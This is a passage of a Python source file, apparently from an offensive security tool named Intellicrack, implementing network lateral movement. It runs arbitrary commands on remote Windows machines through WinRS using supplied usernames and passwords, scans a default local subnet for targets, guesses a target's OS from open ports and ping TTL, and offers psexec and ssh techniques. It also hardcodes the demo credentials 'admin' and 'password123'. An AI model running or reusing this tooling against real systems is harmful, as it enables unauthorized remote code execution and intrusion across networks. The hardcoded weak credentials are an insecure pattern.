            user_domain = f"{domain}\\{username}" if domain else username

            # Execute each command via WinRS
            all_output = []
            last_return_code = 0

            for cmd in commands:
                winrs_cmd = [
                    "winrs",
                    f"-r:{target_ip}",
                    f"-u:{user_domain}",
                    f"-p:{password}",
                    cmd,
                ]

                try:
                    process = subprocess.Popen(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        winrs_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=False
                    )

                    try:
                        stdout, stderr = process.communicate(timeout=30)
                    except subprocess.TimeoutExpired as e:
                        logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
                        process.kill()
                        stdout, stderr = process.communicate()
                    last_return_code = process.returncode

                    if stdout:
                        all_output.append(f"Command: {cmd}")
                        all_output.append(stdout.strip())
                    if stderr:
                        all_output.append(f"Error: {stderr.strip()}")

                except subprocess.TimeoutExpired as e:
                    logger.error("subprocess.TimeoutExpired in lateral_movement.py: %s", e)
                    all_output.append(f"Command timeout: {cmd}")
                    last_return_code = -1
                    break

            execution_time = time.time() - start_time
            success = last_return_code == 0 and all_output

            self.logger.info("WinRS execution completed: success=%s, commands=%s", success, len(commands))

            return {
                "success": success,
                "output": "\n".join(all_output),
                "return_code": last_return_code,
                "execution_time": execution_time,
                "commands_executed": len(commands),
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("WinRS execution failed: %s", e)
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "return_code": -1,
                "execution_time": 0,
            }

    def _parse_powershell_output(self, output: str) -> dict[str, Any]:
        """Parse PowerShell command output for system information."""
        try:
            system_info = {
                "parsed": True,
                "output_length": len(output),
                "contains_error": "error" in output.lower() or "exception" in output.lower(),
                "simulation_mode": "simulation" in output.lower(),
            }

            # Look for computer info patterns
            if "WindowsProductName" in output:
                system_info["windows_detected"] = True

            if "TotalPhysicalMemory" in output:
                system_info["memory_info_detected"] = True

            return system_info

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            return {
                "parsed": False,
                "error": f"Output parsing failed: {e}",
            }


class ConcreteLateralMovement(LateralMovement):
    """Concrete implementation of LateralMovement with required abstract methods."""

    def get_default_method(self) -> str:
        """Get the default persistence method for this platform."""
        import platform

        system = platform.system().lower()
        if system == "windows":
            return "psexec"
        if system == "linux":
            return "ssh"
        return "ssh"

    def list_available_methods(self) -> list:
        """List all available persistence methods for this platform."""
        import platform

        system = platform.system().lower()
        if system == "windows":
            return list(self.movement_techniques.get("windows", {}).keys())
        if system == "linux":
            return list(self.movement_techniques.get("linux", {}).keys())
        return ["ssh"]


class LateralMovementManager:
    """Manager class for lateral movement operations."""

    def __init__(self):
        """Initialize the lateral movement manager with engine and logging."""
        self.movement_engine = ConcreteLateralMovement()
        self.logger = logging.getLogger("IntellicrackLogger.LateralMovementManager")

    def discover_targets(self, network_range: str | None = None) -> dict[str, Any]:
        """Discover potential targets for lateral movement."""
        try:
            if network_range:
                result = self.movement_engine.discover_network(network_range)
            else:
                # Use default network discovery
                result = self.movement_engine.discover_network("192.168.1.0/24")

            return {
                "success": result.get("success", False),
                "targets": result.get("discovered_hosts", []),
                "scan_method": result.get("scan_method", "network_discovery"),
                "error": result.get("error"),
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Target discovery failed: %s", e)
            return {
                "success": False,
                "targets": [],
                "scan_method": "failed",
                "error": str(e),
            }

    def move_to_target(self, target: str, method: str = "auto") -> dict[str, Any]:
        """Perform lateral movement to a specific target."""
        try:
            # Default credentials for demo
            credentials = {
                "username": "admin",
                "password": "password123",
            }

            result = self.movement_engine.attempt_lateral_movement(
                target_ip=target,
                credentials=credentials,
                techniques=[method] if method != "auto" else None,
                payload_path=None,
            )

            return result
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Move to target failed: %s", e)
            return {
                "success": False,
                "error": str(e),
            }

    def move_laterally(self, target_ip: str, credentials: dict[str, str], technique: str = "auto") -> dict[str, Any]:
        """Perform lateral movement to target system."""
        try:
            if technique == "auto":
                # Try multiple techniques automatically
                result = self.movement_engine.attempt_lateral_movement(target_ip, credentials)
            else:
                # Use specific technique
                result = self.movement_engine.attempt_lateral_movement(target_ip, credentials, techniques=[technique])

            return {
                "success": result.get("success", False),
                "session_id": result.get("session_id"),
                "technique_used": result.get("technique", technique),
                "target_info": result.get("target_info", {}),
                "error": result.get("error"),
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Lateral movement failed: %s", e)
            return {
                "success": False,
                "session_id": None,
                "technique_used": technique,
                "target_info": {},
                "error": str(e),
            }

    def _detect_target_os(self, target_ip: str, target_info: dict[str, Any]) -> str:
        """Detect target operating system based on available information."""
        try:
            # Check if we have services information from port scan
            services = target_info.get("services", {})

            # Windows indicators
            windows_ports = [135, 139, 445, 3389, 5985]  # RPC, NetBIOS, SMB, RDP, WinRM
            windows_services = ["smb", "rdp", "winrm", "rpc", "netbios"]

            # Linux indicators
            linux_ports = [22, 23]  # SSH, Telnet
            linux_services = ["ssh", "telnet"]

            windows_score = 0
            linux_score = 0

            # Score based on open ports
            for port in services.keys():
                try:
                    port_num = int(port)
                    if port_num in windows_ports:
                        windows_score += 2
                    elif port_num in linux_ports:
                        linux_score += 2
                except ValueError as e:
                    logger.error("Value error in lateral_movement.py: %s", e)
                    continue

            # Score based on identified services
            for service in services.values():
                service_name = service.get("service", "").lower()
                if any(ws in service_name for ws in windows_services):
                    windows_score += 1
                elif any(ls in service_name for ls in linux_services):
                    linux_score += 1

            # Try to ping and analyze TTL (Windows typically 128, Linux typically 64)
            try:
                if os.name == "nt":
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ["ping", "-n", "1", target_ip],  # noqa: S607
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=5,
                    )
                else:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ["ping", "-c", "1", target_ip],  # noqa: S607
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=5,
                    )

                if result.returncode == 0:
                    output = result.stdout
                    # Look for TTL value
                    if "ttl=" in output.lower():
                        ttl_line = [line for line in output.split("\n") if "ttl=" in line.lower()]
                        if ttl_line:
                            ttl_str = ttl_line[0].lower()
                            # Extract TTL value
                            ttl_start = ttl_str.find("ttl=") + 4
                            ttl_value = ""
                            for char in ttl_str[ttl_start:]:
                                if char.isdigit():
                                    ttl_value += char
                                else:
                                    break

                            if ttl_value:
                                ttl = int(ttl_value)
                                if ttl > 100:  # Likely Windows (128)
                                    windows_score += 3
                                elif ttl < 80:  # Likely Linux (64)
                                    linux_score += 3
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )

            # Return best guess
            if windows_score > linux_score:
                return "windows"
            if linux_score > windows_score:
                return "linux"
            # Default to windows if uncertain (more common in enterprise)
            return "windows"

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.warning("OS detection failed for %s: %s", target_ip, e)
            return "unknown"

    def get_default_method(self) -> str:
        """Get the default lateral movement method based on current platform.

        Returns:
            str: The most reliable default method for the current platform

        """
        current_os = platform.system().lower()

        # Choose based on platform and common network configurations
        if current_os == "windows":
            # PSExec is most reliable on Windows domain environments
            return "psexec"
        if current_os == "linux":
            # SSH is most common on Linux systems
            return "ssh"
        if current_os == "darwin":
            # macOS typically uses SSH
            return "ssh"
        # Default to SSH for unknown platforms (most universal)
        return "ssh"

    def list_available_methods(self) -> list:
        """List all available lateral movement methods across all platforms.

        Returns:
            list: Complete list of available movement techniques

        """
        methods = []

        # Add platform-specific methods with clear naming
        for platform_name, platform_methods in self.movement_engine.movement_techniques.items():
            for method_name in platform_methods.keys():
                methods.append(f"{platform_name}_{method_name}")

        # Sort for consistent ordering
        return sorted(methods)

    def get_platform_methods(self, target_platform: str) -> list:
        """Get available methods for a specific platform.

        Args:
            target_platform: Target platform ('windows', 'linux', etc.)

        Returns:
            list: Methods available for the specified platform

        """
        target_platform = target_platform.lower()
        if target_platform in self.movement_engine.movement_techniques:
            return list(self.movement_engine.movement_techniques[target_platform].keys())
        return []

    def is_method_available(self, method: str, target_platform: str = None) -> bool:
        """Check if a specific lateral movement method is available.

        Args:
            method: Method name to check
            target_platform: Optional platform specification

        Returns:
            bool: True if method is available

        """
        if target_platform:
            target_platform = target_platform.lower()
            if target_platform in self.movement_engine.movement_techniques:
                return method in self.movement_engine.movement_techniques[target_platform]
            return False

        # Check across all platforms
        for platform_methods in self.movement_engine.movement_techniques.values():
            if method in platform_methods:
                return True
        return False
